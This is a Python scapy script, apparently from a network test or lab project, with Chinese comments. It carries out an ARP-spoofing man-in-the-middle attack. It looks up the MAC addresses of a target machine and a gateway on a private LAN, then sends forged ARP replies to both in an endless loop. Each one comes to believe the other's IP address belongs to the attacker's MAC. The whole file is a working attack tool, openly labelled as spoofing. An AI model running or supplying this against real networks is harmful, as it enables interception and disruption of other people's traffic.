from scapy.all import *
from scapy.layers.l2 import ARP, Ether, getmacbyip

from test_case.info import used_iface_name

target_ip = "192.168.0.113"  # 目标IP地址
gateway_ip = "192.168.0.1"  # 网关IP地址
target_mac = getmacbyip(target_ip)
local_ip = get_if_addr(used_iface_name)
local_mac = get_if_hwaddr(used_iface_name)
gateway_mac = getmacbyip(gateway_ip)
print("Gateway MAC address: ", gateway_mac)
print("Target IP address: ", target_ip)
print("Target MAC address: ", target_mac)
print("Local IP address: ", local_ip)
print("Local MAC address: ", local_mac)
# 构造ARP欺骗数据包
arp = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=local_ip, hwsrc=local_mac)
# 发送ARP欺骗数据包
print(arp)
while True:
    sendp(
        Ether(src=local_mac, dst=target_mac) /  # 以攻击者的MAC地址作为源MAC，目标计算机的MAC地址作为目的MAC
        ARP(hwsrc=local_mac, psrc=gateway_ip, hwdst=target_mac, pdst=target_ip, op=2),  # ARP数据包，其中op=2表示ARP回复
        iface=used_iface_name
    )

    # 生成并发送第二个ARP数据包，伪造目标计算机的IP和MAC地址，欺骗网关
    # 使网关认为目标计算机的MAC地址是攻击者的MAC地址
    sendp(
        Ether(src=local_mac, dst=gateway_mac) /  # 以攻击者的MAC地址作为源MAC，网关的MAC地址作为目的MAC
        ARP(hwsrc=local_mac, psrc=target_ip, hwdst=gateway_mac, pdst=gateway_ip, op=2),
        iface=used_iface_name
    )
